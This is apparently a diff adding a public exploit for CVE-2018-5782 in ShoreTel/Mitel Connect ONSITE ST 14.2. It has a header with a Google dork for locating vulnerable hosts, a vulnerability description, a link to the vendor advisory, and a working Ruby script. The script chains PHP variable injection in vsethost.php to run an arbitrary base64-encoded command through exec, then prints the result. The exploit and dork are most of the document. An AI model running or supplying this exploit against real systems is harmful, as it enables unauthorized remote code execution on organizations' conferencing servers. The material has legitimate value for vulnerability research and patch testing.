@@ -1,0 +1,66 @@
+# Exploit Title: ShoreTel / Mitel Connect ONSITE ST14.2 Remote Code Execution
+# Google Dork: +"Public" +"My Conferences" +"Personal Library" +"My Profile" +19.49.5200.0
+# Date: 01-01-2019
+# Exploit Author: twosevenzero
+# Vendor Homepage: https://www.mitel.com/
+# Version: 19.49.5200.0 (and very likely many others prior and after)
+# CVE : CVE-2018-5782 ( https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5782)
+
+Description
+===========
+There are multiple vulnerabilities in ShoreTel/Mitel Connect ONSITE ST 14.2
+which, when chained together, result in remote code execution in the
+context of the running service. The vendor was contacted by Jared McLaren
+of SecureWorks in early 2018 but a proof of concept was not released. I had
+access to a single device during the development of this exploit. As such,
+your system paths may be different and you may need to edit this script to
+fit your needs.
+
+Solution
+========
+The vendor has released a response stating that the newest versions are not
+affected. Please see their response for upgrade instructions.
+
+https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-18-0004
+
+#!/usr/bin/env ruby
+
+require "base64"
+require "methadone"
+require "faraday"
+
+include Methadone::Main
+include Methadone::CLILogging
+
+main do |base_url,command|
+
+  cmd_b64 = Base64.strict_encode64(command.strip)
+
+  conn = Faraday.new(:url => base_url.strip)
+  res = conn.get do |req|
+    req.url "/scripts/vsethost.php", 
+      {
+        :hostId => "system",
+        :keyCode => "base64_decode",
+        :meetingType => "{${gKeyCode}($gSessionDir)}",
+        :sessionDir => cmd_b64,
+        :swfServer => "{${gHostID}($gMeetingType)}",
+        :server => "exec",
+        :dir => "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
+      }
+  end
+
+  rce = conn.get do |req|
+    req.url "/scripts/vmhost.php"
+  end
+
+  print rce.body.to_s
+end
+
+version       "0.1.0"
+description   "Shoretel/Mitel Connect Onsite ST 14.2 Remote Code Execution PoC"
+
+arg :base_url, "URL of vulnerable Connect Onsite ST 14.2 Installation."
+arg :command, "Command to run."
+
+go!
